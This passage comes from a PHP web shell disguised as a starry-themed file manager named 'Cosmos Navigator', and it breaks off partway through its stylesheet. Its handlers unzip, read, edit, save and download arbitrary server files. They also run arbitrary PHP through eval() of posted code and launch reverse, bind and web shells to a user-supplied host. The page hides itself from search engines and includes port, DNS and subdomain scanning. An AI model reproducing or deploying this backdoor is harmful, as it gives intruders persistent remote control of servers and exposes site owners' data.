    if(class_exists('ZipArchive')){
        $files = explode(' ', $_POST['zip_files']);
        $zipname = $_POST['zip_name'];
        if(!str_ends_with($zipname, '.zip')) {
            $zipname .= '.zip';
        }
        $zip = new ZipArchive();
        if($zip->open($dir.'/'.$zipname, ZipArchive::CREATE) === TRUE){
            foreach($files as $file){
                if(file_exists($dir.'/'.$file)){
                    if(is_file($dir.'/'.$file)) {
                        $zip->addFile($dir.'/'.$file, $file);
                    }
                }
            }
            $zip->close();
            $msg = '🗜️ Created zip: '.$zipname;
            $msgType = 'success';
        }else{
            $msg = '❌ Failed to create zip';
            $msgType = 'error';
        }
    }else{
        $msg = '❌ ZipArchive not available';
        $msgType = 'error';
    }
    // Redirect
    header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
    exit;
}

// 8. UNZIP FILE
if(isset($_POST['unzip_file'])){
    if(class_exists('ZipArchive')){
        $zipfile = $_POST['unzip_file'];
        $zip = new ZipArchive();
        if($zip->open($dir.'/'.$zipfile) === TRUE){
            $zip->extractTo($dir);
            $zip->close();
            $msg = '📦 Extracted: '.$zipfile;
            $msgType = 'success';
        }else{
            $msg = '❌ Failed to extract zip';
            $msgType = 'error';
        }
    }else{
        $msg = '❌ ZipArchive not available';
        $msgType = 'error';
    }
    // Redirect
    header('Location: ' . $scriptUrl . '?d=' . urlencode($dir) . '&msg=' . urlencode($msg));
    exit;
}

// ===========================================
// 9. VIEW FILE - TANPA REDIRECT (Langsung tampilkan file)
// ===========================================
if(isset($_GET['view'])){
    $file = $dir.'/'.$_GET['view'];
    if(is_file($file)){
        // Clean buffers before sending file
        while (ob_get_level()) {
            ob_end_clean();
        }
        header('Content-Type: ' . mime_content_type($file));
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ===========================================
// 10. EDIT FILE - TIDAK PERLU REDIRECT, TETAP DI DIR YANG SAMA
// ===========================================
if(isset($_GET['edit'])){
    $file = $dir.'/'.$_GET['edit'];
    if(is_file($file)){
        $editContent = file_get_contents($file);
        $editingFile = $_GET['edit'];
        // TETAP DI DIRECTORY YANG SAMA - tidak perlu redirect
    }
}

// ===========================================
// 11. SAVE EDIT - DENGAN REDIRECT KE DIR YANG SAMA
// ===========================================
if(isset($_POST['save']) && isset($_POST['efile']) && isset($_POST['econt'])){
    $filePath = $_POST['efile'];
    $content = $_POST['econt'];
    
    // Validasi path
    if(strpos($filePath, '..') !== false) {
        $msg = '❌ Invalid file path';
        $msgType = 'error';
    } else {
        if(file_put_contents($filePath, $content)) {
            $msg = '💾 Saved: '.basename($filePath);
            $msgType = 'success';
        } else {
            $msg = '❌ Failed to save file';
            $msgType = 'error';
        }
    }
    
    // REDIRECT KE DIREKTORI YANG SAMA SETELAH SAVE
    $savedDir = dirname($filePath);
    header('Location: ' . $scriptUrl . '?d=' . urlencode($savedDir) . '&msg=' . urlencode($msg));
    exit;
}

// ===========================================
// 12. DOWNLOAD FILE - TANPA REDIRECT (Langsung download)
// ===========================================
if(isset($_GET['dl'])){
    $file = $dir.'/'.$_GET['dl'];
    if(is_file($file)){
        // Clean buffers before download
        while (ob_get_level()) {
            ob_end_clean();
        }
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: no-cache, must-revalidate');
        header('Expires: 0');
        readfile($file);
        exit;
    }
}

// ===========================================
// 13. PHP CODE EXECUTION (ALTERNATIVE TERMINAL)
// ===========================================
if(isset($_POST['php_code'])){
    $phpCode = $_POST['php_code'];
    ob_start();
    eval($phpCode);
    $phpOutput = ob_get_clean();
    $output = isset($output) ? $output . "\n\n--- PHP Execution Output ---\n" . $phpOutput : $phpOutput;
}

// ===========================================
// 14. REVERSE SHELL PROCESSING
// ===========================================
if(isset($_POST['reverse_shell'])) {
    $host = $_POST['rev_host'] ?? '127.0.0.1';
    $port = $_POST['rev_port'] ?? 4444;
    
    $output = reverseShell($host, $port);
    $msg = "🔄 Reverse Shell: " . $output;
    $msgType = strpos($output, 'connected') !== false ? 'success' : 'error';
}

if(isset($_POST['bind_shell'])) {
    $port = $_POST['bind_port'] ?? 4444;
    $output = bindShell($port);
    $msg = "🔗 Bind Shell: " . $output;
    $msgType = 'info';
}

if(isset($_POST['web_shell'])) {
    $port = $_POST['web_port'] ?? 8080;
    $output = webShell($port);
    $msg = "🌐 Web Shell: " . $output;
    $msgType = 'info';
}

// ===========================================
// 15. IP & NETWORK INFO PROCESSING
// ===========================================
if(isset($_POST['port_scan'])) {
    $host = $_POST['scan_host'] ?? '127.0.0.1';
    $startPort = $_POST['start_port'] ?? 1;
    $endPort = $_POST['end_port'] ?? 1000;
    
    $openPorts = portScan($host, $startPort, $endPort);
    $portScanResults = $openPorts;
}

if(isset($_POST['whois_lookup'])) {
    $domain = $_POST['whois_domain'] ?? '';
    if($domain) {
        $whoisInfo = whoisLookup($domain);
    }
}

if(isset($_POST['dns_lookup'])) {
    $domain = $_POST['dns_domain'] ?? '';
    if($domain) {
        $dnsInfo = dnsLookup($domain);
    }
}

if(isset($_POST['traceroute'])) {
    $host = $_POST['trace_host'] ?? 'google.com';
    $traceResult = traceroute($host);
}

if(isset($_POST['subdomain_scan'])) {
    $domain = $_POST['subdomain_domain'] ?? '';
    if($domain) {
        $subdomains = subdomainScanner($domain);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<title>Cosmos Navigator</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<link rel="icon" type="image/png" sizes="16x16" href="https://i.pinimg.com/474x/bc/15/7b/bc157b87b19c916eee79bc7b925ad11e.jpg">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
    background: #0a0a2a;
    color:#ffffff;
    font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
    font-size:14px;
    padding:15px;
    min-height:100vh;
    position:relative;
    overflow-x:hidden;
}

/* STARFIELD BACKGROUND */
.starfield {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    pointer-events: none;
}

.star {
    position: absolute;
    background: white;
    border-radius: 50%;
    animation: twinkle 3s infinite alternate;
}

.star.small {
    width: 1px;
    height: 1px;
    opacity: 0.5;
}

.star.medium {
    width: 2px;
    height: 2px;
    opacity: 0.7;
}

.star.large {
    width: 3px;
    height: 3px;
    opacity: 0.9;
    animation-duration: 2s;
}

.star.shooting {
    width: 2px;
    height: 2px;
    background: linear-gradient(90deg, transparent, #fff, transparent);
    animation: shootingStar 5s infinite linear;
}

@keyframes twinkle {
    0%, 100% { opacity: 0.3; }
    50% { opacity: 1; }
}

@keyframes shootingStar {
    0% {
        transform: translateX(-100vw) translateY(0) rotate(45deg);
        opacity: 0;
    }
    10% {
        opacity: 1;
    }
    20% {
        transform: translateX(100vw) translateY(100vh) rotate(45deg);
        opacity: 0;
    }
    100% {
        opacity: 0;
    }
}

/* NEBULA EFFECT */
.nebula {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    pointer-events: none;
    background: 
        radial-gradient(circle at 20% 30%, rgba(100, 50, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 70%, rgba(255, 50, 100, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 80%, rgba(50, 150, 255, 0.1) 0%, transparent 50%);
    opacity: 0.3;
    animation: nebulaFloat 60s infinite linear;
}

@keyframes nebulaFloat {
    0% { transform: translate(0, 0) scale(1); }
    25% { transform: translate(2%, 1%) scale(1.02); }
    50% { transform: translate(1%, 2%) scale(1.01); }
    75% { transform: translate(-1%, 1%) scale(0.99); }
    100% { transform: translate(0, 0) scale(1); }
}

/* MAIN CONTAINER */
.container {
    max-width: 1400px;
    margin: 0 auto;
    position: relative;
    z-index: 1;
}

/* HEADER */
.header{
    background: linear-gradient(90deg, 
        rgba(0, 17, 255, 0.9) 0%, 
        rgba(255, 0, 255, 0.9) 50%, 
        rgba(0, 243, 255, 0.9) 100%);
    padding: 20px;
    border-radius: 15px;
    margin-bottom: 20px;
    text-align: center;
    border: 2px solid rgba(255, 255, 255, 0.3);
    box-shadow: 0 0 30px rgba(0, 243, 255, 0.4),
                inset 0 0 20px rgba(255, 255, 255, 0.1);
    position: relative;
    overflow: hidden;
    backdrop-filter: blur(10px);
}

.header::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg,
        transparent,
        rgba(255, 255, 255, 0.2),
        transparent);
    animation: headerShine 6s infinite linear;
}

@keyframes headerShine {
    0% { left: -100%; }
    100% { left: 100%; }
}

.header img{
    max-width: 180px;
    height: auto;
    margin-bottom: 15px;
    filter: drop-shadow(0 0 15px rgba(0, 243, 255, 0.8));
}

.header h2 {
    color: white;
    margin: 0;
    text-shadow: 0 0 15px white;
    font-size: 28px;
    letter-spacing: 1px;
}

.header .subtitle {
    font-size: 14px;
    color: #a0f0ff;
    margin-top: 5px;
    letter-spacing: 2px;
    font-weight: 300;
}

/* SYSTEM DASHBOARD */
.dashboard {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 15px;
    margin-bottom: 20px;
}

.dashboard-card {
    background: rgba(20, 30, 60, 0.7);
    border-radius: 12px;
    padding: 20px;
    border: 1px solid rgba(0, 243, 255, 0.3);
    backdrop-filter: blur(10px);
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
}

.dashboard-card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: linear-gradient(90deg, #0011ff, #ff00ff);
}

.dashboard-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 25px rgba(0, 243, 255, 0.2);
    border-color: #00f3ff;
}

.dashboard-card h3 {
    color: #00f3ff;
    margin: 0 0 15px 0;
    font-size: 16px;
    display: flex;
    align-items: center;
    gap: 10px;
}

.dashboard-card h3 i {
    font-size: 18px;
}

/* PROGRESS BARS */
.progress-bar {
    height: 10px;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 5px;
    overflow: hidden;
    margin: 10px 0;
    position: relative;
}

.progress-fill {
    height: 100%;
    border-radius: 5px;
    position: relative;
    overflow: hidden;
    transition: width 0.5s ease;
}

.progress-fill::after {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg,
        transparent,
        rgba(255, 255, 255, 0.3),
        transparent);
    animation: progressShine 2s infinite linear;
}

@keyframes progressShine {
    0% { left: -100%; }
    100% { left: 100%; }
}

/* STATS GRID */
.stats-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 15px;
    margin-top: 15px;
}

.stat-item {
    background: rgba(30, 40, 80, 0.5);
    padding: 12px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.stat-label {
    font-size: 12px;
    color: #88f;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
    gap: 5px;
}

.stat-value {
    font-size: 16px;
    font-weight: bold;
    color: #0f0;
    text-shadow: 0 0 10px currentColor;
}

/* COLOR VARIATIONS */
.cpu-progress { background: linear-gradient(90deg, #ff3333, #ff6666); }
.memory-progress { background: linear-gradient(90deg, #33ff33, #66ff66); }
.disk-progress { background: linear-gradient(90deg, #3333ff, #6666ff); }

/* PATH */
.path{
    background: rgba(10, 20, 40, 0.8);
    padding: 15px;
    border: 2px solid rgba(0, 243, 255, 0.4);
    border-radius: 12px;
    margin: 15px 0;
    word-break: break-all;
    backdrop-filter: blur(10px);
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    font-family: 'Consolas', 'Monaco', monospace;
    position: relative;
    display: flex;
    align-items: center;
    gap: 10px;
}

.path-icon {
    color: #00f3ff;
    font-size: 20px;
}

/* MESSAGE */
.msg{
    background: linear-gradient(90deg, 
        rgba(0, 255, 0, 0.2) 0%, 
        rgba(0, 200, 0, 0.15) 100%);
    padding: 12px 20px;
    border: 1px solid rgba(0, 255, 0, 0.4);
    border-radius: 8px;
    margin: 15px 0;
    color: #8f8;
    backdrop-filter: blur(5px);
    border-left: 4px solid #0f0;
    animation: pulse 2s infinite;
    display: flex;
    align-items: center;
    gap: 10px;
}

.msg.error{
    background: linear-gradient(90deg, 
        rgba(255, 0, 0, 0.2) 0%, 
        rgba(200, 0, 0, 0.15) 100%);
    border: 1px solid rgba(255, 0, 0, 0.4);
    color: #f88;
    border-left: 4px solid #f00;
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; }
}

/* BREADCRUMB */
.breadcrumb{
    background: rgba(20, 30, 60, 0.8);
    padding: 15px;
    border-radius: 10px;
    margin: 15px 0;
    border: 1px solid rgba(0, 243, 255, 0.3);
    backdrop-filter: blur(10px);
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    gap: 10px;
}

.breadcrumb a{
    color: #00f3ff;
    text-decoration: none;
    padding: 8px 15px;
    border-radius: 6px;
    background: rgba(0, 50, 100, 0.3);
    border: 1px solid rgba(0, 243, 255, 0.3);
    transition: all 0.3s ease;
    display: inline-flex;
    align-items: center;
    gap: 8px;
}

.breadcrumb a:hover{
    color: #ffffff;
    background: rgba(0, 100, 200, 0.5);
    border-color: #00f3ff;
    transform: translateY(-1px);
}

.breadcrumb span{
    color: #888;
    font-size: 12px;
}

/* ACTIONS */
.actions{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    gap: 10px;
    margin: 20px 0;
}

.quick-btn{
    padding: 12px;
    background: linear-gradient(135deg, 
        rgba(0, 136, 255, 0.9), 
        rgba(255, 0, 170, 0.9));
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 13px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    transition: all 0.3s ease;
    font-weight: 500;
    position: relative;
    overflow: hidden;
}

.quick-btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg,
        transparent,
        rgba(255, 255, 255, 0.2),
        transparent);
    transition: left 0.5s ease;
}

.quick-btn:hover::before {
    left: 100%;
}

.quick-btn:hover{
    transform: translateY(-2px);
    box-shadow: 0 5px 20px rgba(255, 0, 170, 0.4);
}

/* FILE LIST */
.flist{
    margin: 20px 0;
    background: rgba(20, 30, 60, 0.5);
    border-radius: 12px;
    padding: 15px;
    border: 1px solid rgba(0, 243, 255, 0.3);
}

/* FILE ITEM STYLES */
.fitem{
    background: linear-gradient(135deg,
        rgba(30, 40, 100, 0.7) 0%,
        rgba(20, 30, 80, 0.5) 100%);
    padding: 15px;
    margin: 10px 0;
    border: 1px solid rgba(0, 243, 255, 0.3);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: all 0.3s ease;
    backdrop-filter: blur(5px);
    position: relative;
    overflow: hidden;
}

.fitem:hover{
    background: linear-gradient(135deg,
        rgba(40, 50, 120, 0.8) 0%,
        rgba(30, 40, 100, 0.6) 100%);
    border-color: #00f3ff;
    transform: translateY(-2px);
    box-shadow: 0 5px 20px rgba(0, 243, 255, 0.2);
}

.ficon {
    font-size: 24px;
    margin-right: 15px;
    width: 40px;
    text-align: center;
}

.fname {
    flex: 1;
    overflow: hidden;
}

.fname a.dir-link {
    color: #00f3ff;
    text-decoration: none;
    font-weight: bold;
    font-size: 16px;
    display: block;
    margin-bottom: 5px;
    word-break: break-all;
}

.fname a.dir-link:hover {
    color: #ffffff;
    text-decoration: underline;
}

.facts {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
}

/* BUTTON STYLES */
.btn {
    padding: 8px 12px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 12px;
    font-weight: 500;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 5px;
    transition: all 0.3s ease;
    min-width: 70px;
}

.btn-folder {
    background: linear-gradient(135deg, #00a8ff, #0097e6);
    color: white;
}

.btn-folder:hover {
    background: linear-gradient(135deg, #0097e6, #0088cc);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(0, 168, 255, 0.3);
}

.btn-dl {
    background: linear-gradient(135deg, #4cd137, #44bd32);
    color: white;
}

.btn-dl:hover {
    background: linear-gradient(135deg, #44bd32, #3aa62c);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(76, 209, 55, 0.3);
}

.btn-edit {
    background: linear-gradient(135deg, #ff9f43, #ff8c00);
    color: white;
}

.btn-edit:hover {
    background: linear-gradient(135deg, #ff8c00, #e67e22);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(255, 159, 67, 0.3);
}

.btn-rename {
    background: linear-gradient(135deg, #8a2be2, #7b1fa2);
    color: white;
}

.btn-rename:hover {
    background: linear-gradient(135deg, #7b1fa2, #6a1b9a);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(138, 43, 226, 0.3);
}

.btn-zip {
    background: linear-gradient(135deg, #ff6b6b, #ff5252);
    color: white;
}

.btn-zip:hover {
    background: linear-gradient(135deg, #ff5252, #ff3838);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(255, 107, 107, 0.3);
}

.btn-unzip {
    background: linear-gradient(135deg, #18dcff, #17c0eb);
    color: white;
}

.btn-unzip:hover {
    background: linear-gradient(135deg, #17c0eb, #16a085);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(24, 220, 255, 0.3);
}

.btn-del {
    background: linear-gradient(135deg, #ff3838, #ff0000);
    color: white;
}

.btn-del:hover {
    background: linear-gradient(135deg, #ff0000, #cc0000);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(255, 56, 56, 0.3);
}

/* FORMS */
.tool-form {
    background: rgba(20, 30, 60, 0.8);
    padding: 20px;
    border-radius: 12px;
    margin: 15px 0;
    border: 1px solid rgba(0, 243, 255, 0.3);
    backdrop-filter: blur(10px);
}

.tool-form h4 {
    color: #00f3ff;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 18px;
}

.tool-form input[type="text"],
.tool-form input[type="file"],
.tool-form input[type="number"],
.tool-form textarea {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    background: rgba(30, 40, 80, 0.7);
    border: 2px solid rgba(0, 243, 255, 0.4);
    border-radius: 8px;
    color: white;
    font-size: 14px;
    font-family: 'Consolas', 'Monaco', monospace;
}

.tool-form textarea {
    min-height: 150px;
    resize: vertical;
}

.tool-form input:focus,
.tool-form textarea:focus {
    outline: none;
    border-color: #00f3ff;
    box-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
}

.tool-form button[type="submit"] {
    background: linear-gradient(135deg, #00a8ff, #0097e6);
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 14px;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 10px;
    transition: all 0.3s ease;
}

.tool-form button[type="submit"]:hover {
    background: linear-gradient(135deg, #0097e6, #0088cc);
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(0, 168, 255, 0.3);
}

/* TERMINAL */
.terminal {
    background: rgba(10, 15, 30, 0.9);
    border-radius: 12px;
    margin: 20px 0;
    border: 2px solid #00ff00;
    overflow: hidden;
    box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
}

.termhead {
    background: linear-gradient(90deg, #002200, #004400);
    padding: 12px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 2px solid #00ff00;
}

.termhead > div:first-child {
    display: flex;
    align-items: center;
    gap: 10px;
    color: #00ff00;
    font-family: 'Consolas', 'Monaco', monospace;
}

.termout {
    padding: 20px;
    background: #000;
    color: #00ff00;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    line-height: 1.5;
    max-height: 300px;
    overflow-y: auto;
    white-space: pre-wrap;
    word-break: break-all;
    border-bottom: 1px solid #333;
}

.terminal-form {
    padding: 15px;
    background: rgba(0, 30, 0, 0.8);
}

.cmd-input-container {
    display: flex;
    gap: 10px;
    align-items: center;
}

.cmd-prompt {
    color: #00ff00;
    background: #002200;
    padding: 10px 15px;
    border-radius: 6px;
    font-weight: bold;
    font-family: 'Consolas', 'Monaco', monospace;
    white-space: nowrap;
}

#cmdInput {
    flex: 1;
    padding: 10px 15px;
    background: rgba(0, 40, 0, 0.8);
    border: 2px solid #00ff00;
    border-radius: 6px;
    color: #00ff00;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 14px;
}

#cmdInput:focus {
    outline: none;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
}

.cmd-execute {
    background: linear-gradient(135deg, #00aa00, #008800);
    color: white;
    border: none;
    padding: 10px 20px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.3s ease;
}

.cmd-execute:hover {
    background: linear-gradient(135deg, #008800, #006600);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(0, 170, 0, 0.3);
}

/* EDIT FORM */
.edit-container {
    background: linear-gradient(135deg, rgba(255,170,0,0.15), rgba(255,140,0,0.1));
    padding: 25px;
    border-radius: 12px;
    margin: 20px 0;
    border: 2px solid rgba(255,170,0,0.4);
    backdrop-filter: blur(10px);
}

.edit-header {
    color: #ffaa00;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 20px;
}

.edit-header span {
    color: #ffcc00;
    font-weight: bold;
}

.edit-textarea {
    font-family: 'Consolas', 'Monaco', monospace;
    background: rgba(0, 0, 0, 0.9);
    color: #00ff00;
    border: 2px solid #ffaa00;
    padding: 15px;
    width: 100%;
    min-height: 300px;
    border-radius: 8px;
    resize: vertical;
    font-size: 14px;
    line-height: 1.5;
}

.edit-textarea:focus {
    outline: none;
    box-shadow: 0 0 15px rgba(255,170,0,0.3);
}

.edit-actions {
    display: flex;
    gap: 15px;
    margin-top: 20px;
}

.btn-save {
    background: linear-gradient(135deg, #ffaa00, #ff8800);
    color: white;
    border: none;
    padding: 12px 30px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 14px;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 10px;
    transition: all 0.3s ease;
    flex: 1;
}

.btn-save:hover {
    background: linear-gradient(135deg, #ff8800, #cc6600);
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(255,136,0,0.3);
}

.btn-cancel {
    background: #666;
    color: white;
    border: none;
    padding: 12px 20px;
    border-radius: 8px;
    cursor: pointer;
    text-decoration: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: all 0.3s ease;
}

.btn-cancel:hover {
    background: #777;
    transform: translateY(-2px);
}

/* RENAME MODAL */
.rename-modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.8);
    z-index: 1000;
    align-items: center;
    justify-content: center;
    backdrop-filter: blur(5px);
}

.rename-box {
    background: rgba(20, 30, 60, 0.95);
    padding: 30px;
    border-radius: 15px;
    width: 90%;
    max-width: 500px;
    border: 2px solid #00f3ff;
    box-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
}

.rename-box h3 {
    color: #00f3ff;
    margin-bottom: 25px;
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 22px;
}

.rename-label {
    display: block;
    margin-bottom: 8px;
    color: #88f;
    font-weight: bold;
    font-size: 14px;
}

.rename-input {
    width: 100%;
    padding: 12px 15px;
    margin-bottom: 20px;
    background: rgba(30, 40, 80, 0.8);
    border: 2px solid #00f3ff;
    border-radius: 8px;
    color: white;
    font-size: 14px;
    font-family: 'Consolas', 'Monaco', monospace;
}

.rename-input:focus {
    outline: none;
    box-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
}

.rename-actions {
    display: flex;
    gap: 15px;
    justify-content: flex-end;
    margin-top: 10px;
}

.btn-cancel-modal {
    background: #666;
    color: white;
    border: none;
    padding: 12px 25px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.3s ease;
}

.btn-cancel-modal:hover {
    background: #777;
    transform: translateY(-2px);
}

.btn-confirm {
    background: linear-gradient(135deg, #ff8800, #ff6600);
    color: white;
    border: none;
    padding: 12px 30px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.3s ease;
}

.btn-confirm:hover {
    background: linear-gradient(135deg, #ff6600, #cc5500);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(255,136,0,0.3);
}

/* PHP EXECUTOR */
.php-executor {
    background: rgba(70, 30, 100, 0.8);
    border-radius: 12px;
    margin: 20px 0;
    border: 2px solid #8a2be2;
    overflow: hidden;
}

.php-header {
    background: linear-gradient(90deg, #4b0082, #8a2be2);
    padding: 12px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 2px solid #8a2be2;
}

.php-header > div:first-child {
    display: flex;
    align-items: center;
    gap: 10px;
    color: #ffffff;
    font-family: 'Consolas', 'Monaco', monospace;
    font-weight: bold;
}

.php-textarea {
    width: 100%;
    min-height: 200px;
    padding: 15px;
    background: rgba(40, 20, 60, 0.9);
    border: none;
    color: #ffccff;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 14px;
    resize: vertical;
    border-bottom: 1px solid #8a2be2;
}

.php-textarea:focus {
    outline: none;
    background: rgba(50, 25, 70, 0.95);
}

.php-execute-btn {
    background: linear-gradient(135deg, #8a2be2, #4b0082);
    color: white;
    border: none;
    padding: 12px 25px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
    margin: 15px;
    transition: all 0.3s ease;
}

.php-execute-btn:hover {
    background: linear-gradient(135deg, #4b0082, #321456);
    transform: translateY(-2px);
    box-shadow: 0 3px 10px rgba(138, 43, 226, 0.3);
}

.php-examples {
    background: rgba(60, 30, 90, 0.6);
    padding: 15px;
    border-top: 1px solid #8a2be2;
}

.php-examples h4 {
    color: #d8bfd8;
    margin-bottom: 10px;
    font-size: 14px;
}

.php-example-btn {
    background: rgba(138, 43, 226, 0.3);
    color: #e6e6fa;
    border: 1px solid #8a2be2;
    padding: 6px 12px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 12px;
    margin: 3px;
    transition: all 0.2s ease;
}

.php-example-btn:hover {
    background: rgba(138, 43, 226, 0.5);
    transform: translateY(-1px);
}

/* BYPASS STATUS INDICATOR */
.bypass-status {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 6px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: bold;
    margin-left: 10px;
}

.bypass-enabled {
    background: linear-gradient(135deg, #00ff00, #00cc00);
    color: #002200;
}

.bypass-disabled {
    background: linear-gradient(135deg, #ff3333, #cc0000);
    color: white;
}

/* COMMAND METHODS DISPLAY */
.command-methods {
    background: rgba(30, 40, 80, 0.5);
    padding: 10px;
    border-radius: 8px;
    margin: 10px 0;
    font-size: 12px;
    color: #88f;
    border: 1px solid rgba(0, 243, 255, 0.3);
}

.method-item {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    margin: 2px 5px;
    padding: 3px 8px;
    background: rgba(40, 50, 100, 0.3);
    border-radius: 4px;
}

.method-available {
    color: #0f0;
}

.method-unavailable {
    color: #f00;
    opacity: 0.6;
}

/* TERMINAL WARNING */
.terminal-warning {
    background: linear-gradient(135deg, rgba(255, 100, 0, 0.2), rgba(255, 50, 0, 0.15));
    border: 1px solid rgba(255, 100, 0, 0.4);
    border-left: 4px solid #ff6600;
    padding: 12px 15px;
    margin: 10px 0;
    border-radius: 8px;
    color: #ffcc99;
    display: flex;
    align-items: center;
    gap: 10px;
}

.terminal-warning i {
    color: #ff9900;
    font-size: 18px;
}

/* FOOTER */
.footer {
    margin-top: 30px;
    padding-top: 20px;
    border-top: 1px solid rgba(0, 243, 255, 0.3);
}

.footer-top {
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    padding: 15px;
    background: rgba(20, 30, 60, 0.5);
    border-radius: 10px;
    margin-bottom: 10px;
}

.footer-bottom {
    text-align: center;
    padding-top: 10px;
    color: #666;
    font-size: 11px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
}

/* NETWORK RESULTS */
.network-results {
    background: rgba(20, 30, 60, 0.8);
    border: 1px solid #00f3ff;
    border-radius: 8px;
    padding: 15px;
    margin: 15px 0;
    max-height: 300px;
    overflow-y: auto;
}

.port-item {
    display: flex;
    justify-content: space-between;
    padding: 8px;
    border-bottom: 1px solid rgba(0, 243, 255, 0.2);
}

.port-item:last-child {
    border-bottom: none;
}

.port-open {
    color: #0f0;
}

.port-closed {
    color: #f00;
    opacity: 0.6;
}

.subdomain-item {
    background: rgba(40, 50, 100, 0.3);
    padding: 10px;
    margin: 5px 0;
    border-radius: 5px;
    border-left: 3px solid #00f3ff;
}

.geo-info {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    gap: 10px;
    margin-top: 10px;
}

.geo-item {
    background: rgba(30, 40, 80, 0.5);
    padding: 10px;
    border-radius: 5px;
    text-align: center;
}

/* Scrollbar */
::-webkit-scrollbar {
    width: 10px;
    height: 10px;
}

::-webkit-scrollbar-track {
    background: rgba(20, 30, 60, 0.5);
    border-radius: 5px;
